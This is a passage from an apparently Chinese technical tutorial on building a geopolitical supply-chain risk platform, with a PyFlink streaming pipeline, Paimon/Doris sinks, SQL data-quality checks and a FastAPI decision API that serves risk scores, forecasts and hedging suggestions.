            <span class="hljs-string">'geopolitical_conflict_events'</span>,
            <span class="hljs-string">'sanctions_and_regulations'</span>,
            <span class="hljs-string">'commodity_prices_stream'</span>,
            <span class="hljs-string">'port_logistics_status'</span>,
            <span class="hljs-string">'financial_indicators'</span>
        ]
        
        kafka_source = FlinkKafkaConsumer(
            topics=topics,
            deserialization_schema=JsonRowSerializationSchema.Builder()
                .type_info(Types.ROW_NAMED(
                    [<span class="hljs-string">'event_id'</span>, <span class="hljs-string">'ingest_timestamp'</span>, <span class="hljs-string">'raw_text'</span>, <span class="hljs-string">'source_type'</span>, ...],
                    [Types.STRING(), Types.STRING(), Types.STRING(), Types.STRING(), ...]
                )).build(),
            properties=kafka_props
        )
        
        <span class="hljs-comment"># 水位线策略 (事件时间)</span>
        kafka_source.assign_timestamps_and_watermarks(
            WatermarkStrategy.for_bounded_out_of_orderness(timedelta(seconds=<span class="hljs-number">10</span>))
                .with_timestamp_assigner(<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(datetime.fromisoformat(
                    x.get(<span class="hljs-string">'ingest_timestamp'</span>)).timestamp() * <span class="hljs-number">1000</span>))
        )
        
        <span class="hljs-keyword">return</span> env.add_source(kafka_source)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">build_pipeline</span>(<span class="hljs-params">self, env</span>):
        <span class="hljs-string">"""构建完整的数据处理管道"""</span>
        
        <span class="hljs-comment"># 1. Source</span>
        raw_stream = self.create_kafka_source(env)
        
        <span class="hljs-comment"># 2. 数据清洗 (并行度16)</span>
        cleaned_stream = raw_stream \
            .<span class="hljs-built_in">map</span>(DataCleaningFunction()) \
            .set_parallelism(<span class="hljs-number">16</span>) \
            .name(<span class="hljs-string">'DataCleaning'</span>)
        
        <span class="hljs-comment"># 3. 去重 (KeyedProcessFunction, 使用RocksDB状态)</span>
        deduped_stream = cleaned_stream \
            .key_by(<span class="hljs-keyword">lambda</span> x: x.get(<span class="hljs-string">'source_url'</span>)) \
            .process(DeduplicationFunction()) \
            .set_parallelism(<span class="hljs-number">32</span>) \
            .name(<span class="hljs-string">'Deduplication'</span>)
        
        <span class="hljs-comment"># 4. 地理编码与实体识别 (可选的外部API调用)</span>
        geo_enriched_stream = deduped_stream \
            .<span class="hljs-built_in">map</span>(GeoEnrichmentFunction()) \
            .set_parallelism(<span class="hljs-number">16</span>) \
            .name(<span class="hljs-string">'GeoEnrichment'</span>)
        
        <span class="hljs-comment"># 5. 时间窗口聚合 (Tumbling Window, 60秒)</span>
        windowed_stream = geo_enriched_stream \
            .key_by(<span class="hljs-keyword">lambda</span> x: (x.get(<span class="hljs-string">'buyer_geo_key'</span>), x.get(<span class="hljs-string">'commodity_type'</span>))) \
            .window(TumblingEventTimeWindow.of(timedelta(seconds=<span class="hljs-number">60</span>))) \
            .apply(DimensionScoreCalculator()) \
            .set_parallelism(<span class="hljs-number">32</span>) \
            .name(<span class="hljs-string">'DimensionScoreCalculation'</span>)
        
        <span class="hljs-comment"># 6. 综合指标计算</span>
        composite_stream = windowed_stream \
            .<span class="hljs-built_in">map</span>(CompositeRiskCalculator()) \
            .set_parallelism(<span class="hljs-number">16</span>) \
            .name(<span class="hljs-string">'CompositeRiskCalculation'</span>)
        
        <span class="hljs-comment"># 7. 输出 - Sink到多个目标</span>
        
        <span class="hljs-comment"># Sink 1: Paimon (标准化事件表)</span>
        paimon_sink = self.create_paimon_sink(<span class="hljs-string">'standardized_events'</span>)
        deduped_stream.add_sink(paimon_sink).name(<span class="hljs-string">'PaimonStandardizedEvents'</span>)
        
        <span class="hljs-comment"># Sink 2: Paimon (维度指标表)</span>
        dimension_sink = self.create_paimon_sink(<span class="hljs-string">'dimension_scores'</span>)
        windowed_stream.add_sink(dimension_sink).name(<span class="hljs-string">'PaimonDimensionScores'</span>)
        
        <span class="hljs-comment"># Sink 3: Doris (最终指标表)</span>
        doris_sink = DorisStreamLoad(
            <span class="hljs-string">'doris_cdc'</span>,
            <span class="hljs-string">'mgir'</span>,
            <span class="hljs-string">'mgir_indices_fact'</span>,
            options={
                <span class="hljs-string">'fenodes'</span>: <span class="hljs-string">'doris_fe:8030'</span>,
                <span class="hljs-string">'username'</span>: <span class="hljs-string">'root'</span>,
                <span class="hljs-string">'password'</span>: <span class="hljs-string">'doris_password'</span>
            }
        )
        composite_stream.add_sink(doris_sink).name(<span class="hljs-string">'DorisIndices'</span>)
        
        <span class="hljs-comment"># Sink 4: 告警系统 (Red级风险)</span>
        alert_stream = composite_stream \
            .<span class="hljs-built_in">filter</span>(<span class="hljs-keyword">lambda</span> x: x.get(<span class="hljs-string">'risk_alert_level'</span>) == <span class="hljs-string">'Red'</span>) \
            .<span class="hljs-built_in">map</span>(AlertFormattingFunction()) \
            .set_parallelism(<span class="hljs-number">4</span>) \
            .name(<span class="hljs-string">'AlertFiltering'</span>)
        
        alert_kafka_sink = FlinkKafkaProducer(
            <span class="hljs-string">'alert_notifications'</span>,
            serialization_schema=JsonRowSerializationSchema.Builder().build(),
            producer_config={<span class="hljs-string">'bootstrap.servers'</span>: <span class="hljs-string">'kafka1:9092,kafka2:9092,kafka3:9092'</span>}
        )
        alert_stream.add_sink(alert_kafka_sink).name(<span class="hljs-string">'KafkaAlerts'</span>)
        
        <span class="hljs-comment"># Sink 5: 监控指标输出</span>
        metrics_stream = composite_stream \
            .<span class="hljs-built_in">map</span>(MetricsFormattingFunction()) \
            .set_parallelism(<span class="hljs-number">4</span>) \
            .name(<span class="hljs-string">'MetricsFormatting'</span>)
        
        <span class="hljs-comment"># 输出到Prometheus Push Gateway (可选)</span>
        metrics_stream.add_sink(PrometheusMetricsSink()).name(<span class="hljs-string">'PrometheusMetrics'</span>)
        
        <span class="hljs-keyword">return</span> env
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_paimon_sink</span>(<span class="hljs-params">self, table_name</span>):
        <span class="hljs-string">"""创建Paimon Sink"""</span>
        <span class="hljs-comment"># 这里使用Paimon的FlinkDataStreamSink</span>
        <span class="hljs-comment"># 实际使用时需要引入paimon-flink-runtime的相关依赖</span>
        <span class="hljs-keyword">return</span> PaimonStreamSink(
            catalog=<span class="hljs-string">'paimon_catalog'</span>,
            database=<span class="hljs-string">'default'</span>,
            table=table_name,
            options={
                <span class="hljs-string">'warehouse'</span>: <span class="hljs-string">'hdfs://namenode:8020/paimon'</span>,
                <span class="hljs-string">'bucket'</span>: <span class="hljs-string">'64'</span>,
                <span class="hljs-string">'file.compression'</span>: <span class="hljs-string">'lz4'</span>
            }
        )
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">submit_job</span>(<span class="hljs-params">self, env, job_name</span>):
        <span class="hljs-string">"""提交Flink任务"""</span>
        env.execute(job_name)

<span class="hljs-comment"># 辅助函数类</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataCleaningFunction</span>(<span class="hljs-title class_ inherited__">MapFunction</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">map</span>(<span class="hljs-params">self, element</span>):
        <span class="hljs-comment"># ... 数据清洗逻辑</span>
        <span class="hljs-keyword">return</span> element

<span class="hljs-keyword">class</span> <span class="hljs-title class_">GeoEnrichmentFunction</span>(<span class="hljs-title class_ inherited__">MapFunction</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">map</span>(<span class="hljs-params">self, element</span>):
        <span class="hljs-comment"># 调用外部GeoIP或地理编码服务</span>
        <span class="hljs-comment"># 填充location_latitude, location_longitude, detected_geo_keys</span>
        <span class="hljs-keyword">return</span> element

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DimensionScoreCalculator</span>(<span class="hljs-title class_ inherited__">WindowFunction</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">apply</span>(<span class="hljs-params">self, key, window, elements</span>):
        <span class="hljs-comment"># 在60秒窗口内计算LDI, CRI, GRI, FRI</span>
        <span class="hljs-comment"># 返回维度指标</span>
        <span class="hljs-keyword">yield</span> {
            <span class="hljs-string">'buyer_geo_key'</span>: key[<span class="hljs-number">0</span>],
            <span class="hljs-string">'commodity_type'</span>: key[<span class="hljs-number">1</span>],
            <span class="hljs-string">'window_end'</span>: window.end,
            <span class="hljs-string">'ldi_score'</span>: ...,
            <span class="hljs-string">'cri_score'</span>: ...,
            <span class="hljs-string">'gri_score'</span>: ...,
            <span class="hljs-string">'fri_score'</span>: ...
        }

<span class="hljs-keyword">class</span> <span class="hljs-title class_">CompositeRiskCalculator</span>(<span class="hljs-title class_ inherited__">MapFunction</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">map</span>(<span class="hljs-params">self, element</span>):
        <span class="hljs-comment"># 综合计算: 40%(A+B)/2 + 60%(C+D)/2</span>
        element[<span class="hljs-string">'composite_risk_index'</span>] = (
            <span class="hljs-number">0.4</span> * (element[<span class="hljs-string">'ldi_score'</span>] + element[<span class="hljs-string">'cri_score'</span>]) / <span class="hljs-number">2</span> +
            <span class="hljs-number">0.6</span> * (element[<span class="hljs-string">'gri_score'</span>] + element[<span class="hljs-string">'fri_score'</span>]) / <span class="hljs-number">2</span>
        ) * <span class="hljs-number">10</span>
        
        <span class="hljs-comment"># 转换为预警等级</span>
        <span class="hljs-keyword">if</span> element[<span class="hljs-string">'composite_risk_index'</span>] &lt; <span class="hljs-number">25</span>:
            element[<span class="hljs-string">'risk_alert_level'</span>] = <span class="hljs-string">'Green'</span>
        <span class="hljs-keyword">elif</span> element[<span class="hljs-string">'composite_risk_index'</span>] &lt; <span class="hljs-number">50</span>:
            element[<span class="hljs-string">'risk_alert_level'</span>] = <span class="hljs-string">'Yellow'</span>
        <span class="hljs-keyword">elif</span> element[<span class="hljs-string">'composite_risk_index'</span>] &lt; <span class="hljs-number">75</span>:
            element[<span class="hljs-string">'risk_alert_level'</span>] = <span class="hljs-string">'Orange'</span>
        <span class="hljs-keyword">else</span>:
            element[<span class="hljs-string">'risk_alert_level'</span>] = <span class="hljs-string">'Red'</span>
        
        <span class="hljs-keyword">return</span> element

<span class="hljs-keyword">class</span> <span class="hljs-title class_">AlertFormattingFunction</span>(<span class="hljs-title class_ inherited__">MapFunction</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">map</span>(<span class="hljs-params">self, element</span>):
        <span class="hljs-comment"># 格式化告警消息</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'alert_id'</span>: element[<span class="hljs-string">'event_id'</span>],
            <span class="hljs-string">'buyer_geo_key'</span>: element[<span class="hljs-string">'buyer_geo_key'</span>],
            <span class="hljs-string">'risk_score'</span>: element[<span class="hljs-string">'composite_risk_index'</span>],
            <span class="hljs-string">'timestamp'</span>: datetime.now().isoformat(),
            <span class="hljs-string">'message'</span>: <span class="hljs-string">f"Red Alert: Risk score <span class="hljs-subst">{element[<span class="hljs-string">'composite_risk_index'</span>]:<span class="hljs-number">.1</span>f}</span> for <span class="hljs-subst">{element[<span class="hljs-string">'buyer_geo_key'</span>]}</span>"</span>
        }

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MetricsFormattingFunction</span>(<span class="hljs-title class_ inherited__">MapFunction</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">map</span>(<span class="hljs-params">self, element</span>):
        <span class="hljs-comment"># 输出Prometheus格式的指标</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'metric'</span>: <span class="hljs-string">'mgir_composite_risk_index'</span>,
            <span class="hljs-string">'tags'</span>: {
                <span class="hljs-string">'buyer'</span>: element[<span class="hljs-string">'buyer_geo_key'</span>],
                <span class="hljs-string">'commodity'</span>: element[<span class="hljs-string">'commodity_type'</span>]
            },
            <span class="hljs-string">'value'</span>: element[<span class="hljs-string">'composite_risk_index'</span>],
            <span class="hljs-string">'timestamp'</span>: <span class="hljs-built_in">int</span>(datetime.now().timestamp())
        }

<span class="hljs-comment"># 主程序</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    pipeline = CompleteFlinKETLPipeline()
    env = pipeline.create_environment()
    env = pipeline.build_pipeline(env)
    pipeline.submit_job(env, <span class="hljs-string">'mgir_complete_etl_pipeline'</span>)
</code></pre>
<h4 data-id="heading-11">数据验证与质量检查</h4>
<pre><code class="hljs language-sql" lang="sql">在Paimon中执行数据质量检查:

```<span class="hljs-keyword">sql</span>
<span class="hljs-comment">-- 1. 数据新鲜度检查</span>
<span class="hljs-keyword">SELECT</span> 
    <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">as</span> total_events,
    <span class="hljs-built_in">MAX</span>(ingest_timestamp) <span class="hljs-keyword">as</span> latest_update,
    <span class="hljs-built_in">CURRENT_TIMESTAMP</span> <span class="hljs-operator">-</span> <span class="hljs-built_in">MAX</span>(ingest_timestamp) <span class="hljs-keyword">as</span> age_minutes
<span class="hljs-keyword">FROM</span> paimon_catalog.standardized_events
<span class="hljs-keyword">WHERE</span> risk_date <span class="hljs-operator">&gt;=</span> <span class="hljs-built_in">CURRENT_DATE</span> <span class="hljs-operator">-</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-number">1</span> <span class="hljs-keyword">DAY</span>;

<span class="hljs-comment">-- 2. 去重检查</span>
<span class="hljs-keyword">SELECT</span> 
    <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">as</span> total_records,
    <span class="hljs-built_in">COUNT</span>(<span class="hljs-keyword">DISTINCT</span> event_id) <span class="hljs-keyword">as</span> unique_events,
    <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-operator">-</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-keyword">DISTINCT</span> event_id) <span class="hljs-keyword">as</span> duplicate_count
<span class="hljs-keyword">FROM</span> paimon_catalog.standardized_events;

<span class="hljs-comment">-- 3. 分类覆盖率</span>
<span class="hljs-keyword">SELECT</span> 
    delivery_impact_dim,
    <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">as</span> count,
    ROUND(<span class="hljs-number">100.0</span> <span class="hljs-operator">*</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-operator">/</span> <span class="hljs-built_in">SUM</span>(<span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>)) <span class="hljs-keyword">OVER</span> (), <span class="hljs-number">2</span>) <span class="hljs-keyword">as</span> percentage
<span class="hljs-keyword">FROM</span> paimon_catalog.standardized_events
<span class="hljs-keyword">WHERE</span> risk_date <span class="hljs-operator">&gt;=</span> <span class="hljs-built_in">CURRENT_DATE</span> <span class="hljs-operator">-</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-number">7</span> <span class="hljs-keyword">DAY</span>
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> delivery_impact_dim;

<span class="hljs-comment">-- 4. 置信度分布</span>
<span class="hljs-keyword">SELECT</span> 
    ROUND(<span class="hljs-built_in">AVG</span>(confidence_score_nlp), <span class="hljs-number">3</span>) <span class="hljs-keyword">as</span> avg_confidence,
    <span class="hljs-built_in">MIN</span>(confidence_score_nlp) <span class="hljs-keyword">as</span> min_confidence,
    <span class="hljs-built_in">MAX</span>(confidence_score_nlp) <span class="hljs-keyword">as</span> max_confidence,
    <span class="hljs-built_in">PERCENTILE_CONT</span>(<span class="hljs-number">0.95</span>) <span class="hljs-keyword">WITHIN</span> <span class="hljs-keyword">GROUP</span> (<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> confidence_score_nlp) <span class="hljs-keyword">as</span> p95
<span class="hljs-keyword">FROM</span> paimon_catalog.standardized_events
<span class="hljs-keyword">WHERE</span> risk_date <span class="hljs-operator">&gt;=</span> <span class="hljs-built_in">CURRENT_DATE</span> <span class="hljs-operator">-</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-number">1</span> <span class="hljs-keyword">DAY</span>;


预期结果:
├─ 数据延迟 <span class="hljs-operator">&lt;</span><span class="hljs-number">5</span>分钟
├─ 去重率 <span class="hljs-operator">&gt;</span><span class="hljs-number">99</span><span class="hljs-operator">%</span>
├─ A<span class="hljs-operator">/</span>B<span class="hljs-operator">/</span>C<span class="hljs-operator">/</span>D分布 均匀 (各<span class="hljs-number">20</span><span class="hljs-number">-30</span><span class="hljs-operator">%</span>)
└─ 平均信心度 <span class="hljs-operator">&gt;</span><span class="hljs-number">0.7</span>
</code></pre>
<hr/>
<h2 data-id="heading-12">决策API与BI仪表板开发</h2>
<h3 data-id="heading-13">决策API设计与实现</h3>
<h4 data-id="heading-14">API规范设计</h4>
<pre><code class="hljs language-bash" lang="bash">RESTful API 设计:

1. /v1/risk/latest_alert
   ├─ 方法: GET
   ├─ 参数: geo_key (采购商ID)
   ├─ 返回:
   │  {
   │    <span class="hljs-string">"buyer_geo_key"</span>: <span class="hljs-string">"BUYER_SH_001"</span>,
   │    <span class="hljs-string">"composite_risk_index"</span>: 75.3,
   │    <span class="hljs-string">"risk_alert_level"</span>: <span class="hljs-string">"Red"</span>,
   │    <span class="hljs-string">"last_update"</span>: <span class="hljs-string">"2025-11-30T10:30:00Z"</span>,
   │    <span class="hljs-string">"top_triggers"</span>: [
   │      {
   │        <span class="hljs-string">"event_id"</span>: <span class="hljs-string">"evt_001"</span>,
   │        <span class="hljs-string">"source"</span>: <span class="hljs-string">"Reuters"</span>,
   │        <span class="hljs-string">"type"</span>: <span class="hljs-string">"A"</span>,
   │        <span class="hljs-string">"severity"</span>: 8.5
   │      }
   │    ]
   │  }
   ├─ 缓存: 1分钟
   └─ 实现: 从Doris直接查询

2. /v1/risk/events
   ├─ 方法: GET
   ├─ 参数:
   │  ├─ buyer (采购商ID)
   │  ├─ timeframe (24h/7d/30d)
   │  ├─ <span class="hljs-built_in">type</span> (A/B/C/D, 可选)
   │  └─ <span class="hljs-built_in">limit</span> (默认100)
   ├─ 返回: 该采购商在时间段内的所有触发事件列表
   └─ 实现: Doris查询 + 缓存

3. /v1/risk/forecast
   ├─ 方法: GET
   ├─ 参数:
   │  ├─ geo_key
   │  └─ days (1/7/30)
   ├─ 返回: 未来N天的风险预测
   │  {
   │    <span class="hljs-string">"forecast"</span>: [
   │      {<span class="hljs-string">"date"</span>: <span class="hljs-string">"2025-12-01"</span>, <span class="hljs-string">"predicted_risk"</span>: 52.3},
   │      {<span class="hljs-string">"date"</span>: <span class="hljs-string">"2025-12-02"</span>, <span class="hljs-string">"predicted_risk"</span>: 48.9}
   │    ],
   │    <span class="hljs-string">"confidence"</span>: 0.65
   │  }
   └─ 实现: 基于历史趋势的简单外推 (ARIMA或机器学习)

4. /v1/hedging/suggestion
   ├─ 方法: GET
   ├─ 参数:
   │  ├─ geo_key
   │  └─ commodity
   ├─ 返回:
   │  {
   │    <span class="hljs-string">"hedging_needed"</span>: <span class="hljs-literal">true</span>,
   │    <span class="hljs-string">"hedging_ratio"</span>: 0.35,  <span class="hljs-comment"># 建议对冲比例</span>
   │    <span class="hljs-string">"hedging_instrument"</span>: <span class="hljs-string">"futures"</span>,
   │    <span class="hljs-string">"futures_contract"</span>: <span class="hljs-string">"CRU_DEC25"</span>,
   │    <span class="hljs-string">"notional_value"</span>: 50000000,  <span class="hljs-comment"># 对冲名义价值</span>
   │    <span class="hljs-string">"estimated_cost"</span>: 125000  <span class="hljs-comment"># 对冲成本估计</span>
   │  }
   └─ 实现: 根据综合风险指数推荐

5. /v1/logistics/alternative_routes
   ├─ 方法: POST
   ├─ 请求体:
   │  {
   │    <span class="hljs-string">"origin_port"</span>: <span class="hljs-string">"Shanghai"</span>,
   │    <span class="hljs-string">"dest_port"</span>: <span class="hljs-string">"Rotterdam"</span>,
   │    <span class="hljs-string">"commodity"</span>: <span class="hljs-string">"Iron Ore"</span>,
   │    <span class="hljs-string">"current_risk_level"</span>: <span class="hljs-string">"Orange"</span>
   │  }
   ├─ 返回: 替代路线及成本对比
   │  {
   │    <span class="hljs-string">"routes"</span>: [
   │      {
   │        <span class="hljs-string">"route_id"</span>: <span class="hljs-string">"route_1"</span>,
   │        <span class="hljs-string">"waypoints"</span>: [<span class="hljs-string">"Shanghai"</span>, <span class="hljs-string">"Singapore"</span>, <span class="hljs-string">"Suez"</span>, <span class="hljs-string">"Rotterdam"</span>],
   │        <span class="hljs-string">"risk_score"</span>: 45,
   │        <span class="hljs-string">"duration_days"</span>: 35,
   │        <span class="hljs-string">"additional_cost_pct"</span>: 5.2,
   │        <span class="hljs-string">"feasibility"</span>: <span class="hljs-string">"high"</span>
   │      }
   │    ]
   │  }
   └─ 实现: 基于当前风险指数和运输网络的推荐
</code></pre>
<p>API实现 (Python FastAPI):</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Query
<span class="hljs-keyword">from</span> fastapi.responses <span class="hljs-keyword">import</span> JSONResponse
<span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine
<span class="hljs-keyword">import</span> sqlalchemy <span class="hljs-keyword">as</span> sa
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span>
<span class="hljs-keyword">import</span> json

app = FastAPI(title=<span class="hljs-string">'MGIR Decision API'</span>, version=<span class="hljs-string">'1.0.0'</span>)

<span class="hljs-comment"># Doris连接</span>
doris_engine = create_engine(<span class="hljs-string">'mysql+pymysql://root:password@doris_fe:9030/mgir'</span>)

<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">'/v1/risk/latest_alert'</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_latest_alert</span>(<span class="hljs-params">geo_key: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-string">"""获取采购商最新风险评分"""</span>
    <span class="hljs-keyword">with</span> doris_engine.connect() <span class="hljs-keyword">as</span> conn:
        query = sa.text(<span class="hljs-string">'''
            SELECT 
                buyer_geo_key,
                composite_risk_index,
                CASE 
                    WHEN composite_risk_index &lt; 25 THEN 'Green'
                    WHEN composite_risk_index &lt; 50 THEN 'Yellow'
                    WHEN composite_risk_index &lt; 75 THEN 'Orange'
                    ELSE 'Red'
                END as risk_alert_level,
                MAX(ingest_timestamp) as last_update
            FROM mgir_indices_fact
            WHERE buyer_geo_key = :geo_key
                AND risk_date &gt;= CURDATE()
            LIMIT 1
        '''</span>)
        
        result = conn.execute(query, {<span class="hljs-string">'geo_key'</span>: geo_key}).fetchone()
        
        <span class="hljs-keyword">if</span> result:
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'buyer_geo_key'</span>: result[<span class="hljs-number">0</span>],
                <span class="hljs-string">'composite_risk_index'</span>: <span class="hljs-built_in">float</span>(result[<span class="hljs-number">1</span>]),
                <span class="hljs-string">'risk_alert_level'</span>: result[<span class="hljs-number">2</span>],
                <span class="hljs-string">'last_update'</span>: result[<span class="hljs-number">3</span>].isoformat() <span class="hljs-keyword">if</span> result[<span class="hljs-number">3</span>] <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>
            }
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'error'</span>: <span class="hljs-string">'No data found'</span>}, <span class="hljs-number">404</span>

<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">'/v1/risk/events'</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_risk_events</span>(<span class="hljs-params">
    buyer: <span class="hljs-built_in">str</span>,
    timeframe: <span class="hljs-built_in">str</span> = <span class="hljs-string">'24h'</span>,
    <span class="hljs-built_in">type</span>: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = <span class="hljs-literal">None</span>,
    limit: <span class="hljs-built_in">int</span> = <span class="hljs-number">100</span>
</span>):
    <span class="hljs-string">"""获取采购商的风险事件列表"""</span>
    <span class="hljs-keyword">if</span> timeframe == <span class="hljs-string">'24h'</span>:
        since = datetime.utcnow() - timedelta(hours=<span class="hljs-number">24</span>)
    <span class="hljs-keyword">elif</span> timeframe == <span class="hljs-string">'7d'</span>:
        since = datetime.utcnow() - timedelta(days=<span class="hljs-number">7</span>)
    <span class="hljs-keyword">elif</span> timeframe == <span class="hljs-string">'30d'</span>:
        since = datetime.utcnow() - timedelta(days=<span class="hljs-number">30</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> {<span class="hljs-string">'error'</span>: <span class="hljs-string">'Invalid timeframe'</span>}, <span class="hljs-number">400</span>
    
    <span class="hljs-keyword">with</span> doris_engine.connect() <span class="hljs-keyword">as</span> conn:
        query_str = <span class="hljs-string">'''
            SELECT 
                event_id,
                ingest_timestamp,
                delivery_impact_dim,
                impact_severity_score,
                sentiment_score_nlp,
                source_url,
                confidence_score_nlp
            FROM mgir_indices_fact
            WHERE buyer_geo_key = :buyer
                AND ingest_timestamp &gt;= :since
        '''</span>
        
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>:
            query_str += <span class="hljs-string">f' AND delivery_impact_dim = :type'</span>
        
        query_str += <span class="hljs-string">f' ORDER BY ingest_timestamp DESC LIMIT <span class="hljs-subst">{limit}</span>'</span>
        
        params = {<span class="hljs-string">'buyer'</span>: buyer, <span class="hljs-string">'since'</span>: since}
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>:
            params[<span class="hljs-string">'type'</span>] = <span class="hljs-built_in">type</span>
        
        results = conn.execute(sa.text(query_str), params).fetchall()
        
        events = []
        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> results:
            events.append({
                <span class="hljs-string">'event_id'</span>: row[<span class="hljs-number">0</span>],
                <span class="hljs-string">'timestamp'</span>: row[<span class="hljs-number">1</span>].isoformat(),
                <span class="hljs-string">'type'</span>: row[<span class="hljs-number">2</span>],
                <span class="hljs-string">'severity'</span>: <span class="hljs-built_in">float</span>(row[<span class="hljs-number">3</span>]),
                <span class="hljs-string">'sentiment'</span>: <span class="hljs-built_in">float</span>(row[<span class="hljs-number">4</span>]),
                <span class="hljs-string">'source'</span>: row[<span class="hljs-number">5</span>],
                <span class="hljs-string">'confidence'</span>: <span class="hljs-built_in">float</span>(row[<span class="hljs-number">6</span>])
            })
        
        <span class="hljs-keyword">return</span> {<span class="hljs-string">'events'</span>: events, <span class="hljs-string">'count'</span>: <span class="hljs-built_in">len</span>(events)}

<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">'/v1/risk/forecast'</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_risk_forecast</span>(<span class="hljs-params">geo_key: <span class="hljs-built_in">str</span>, days: <span class="hljs-built_in">int</span> = <span class="hljs-number">7</span></span>):
    <span class="hljs-string">"""预测未来N天的风险趋势"""</span>
    <span class="hljs-keyword">with</span> doris_engine.connect() <span class="hljs-keyword">as</span> conn:
        <span class="hljs-comment"># 获取过去30天的数据用于趋势分析</span>
        query = sa.text(<span class="hljs-string">'''
            SELECT 
                DATE(risk_date) as date,
                AVG(composite_risk_index) as avg_risk
            FROM mgir_indices_fact
            WHERE buyer_geo_key = :geo_key
                AND risk_date &gt;= CURDATE() - INTERVAL 30 DAY
            GROUP BY DATE(risk_date)
            ORDER BY date DESC
        '''</span>)
        
        results = conn.execute(query, {<span class="hljs-string">'geo_key'</span>: geo_key}).fetchall()
        
        <span class="hljs-comment"># 简单的移动平均预测</span>
        historical_data = [(row[<span class="hljs-number">0</span>], <span class="hljs-built_in">float</span>(row[<span class="hljs-number">1</span>])) <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> results]
        
        forecast = []
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(historical_data) &gt;= <span class="hljs-number">7</span>:
            <span class="hljs-comment"># 计算最近7天的平均作为基准</span>
            recent_avg = <span class="hljs-built_in">sum</span>(v <span class="hljs-keyword">for</span> d, v <span class="hljs-keyword">in</span> historical_data[:<span class="hljs-number">7</span>]) / <span class="hljs-number">7</span>
            
            <span class="hljs-comment"># 简单的线性趋势</span>
            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(days):
                future_date = datetime.utcnow().date() + timedelta(days=i+<span class="hljs-number">1</span>)
                <span class="hljs-comment"># 加入随机波动</span>
                predicted = recent_avg + (i * <span class="hljs-number">0.5</span>)  <span class="hljs-comment"># 每天趋势增加0.5分</span>
                forecast.append({
                    <span class="hljs-string">'date'</span>: future_date.isoformat(),
                    <span class="hljs-string">'predicted_risk'</span>: <span class="hljs-built_in">min</span>(<span class="hljs-number">100</span>, <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, predicted))
                })
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'geo_key'</span>: geo_key,
            <span class="hljs-string">'forecast'</span>: forecast,
            <span class="hljs-string">'confidence'</span>: <span class="hljs-number">0.65</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(historical_data) &gt;= <span class="hljs-number">7</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0.35</span>
        }

<span class="hljs-comment"># 启动API服务</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    <span class="hljs-keyword">import</span> uvicorn
    uvicorn.run(app, host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">8000</span>)
</code></pre>
<p>部署:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 创建systemd服务</span>
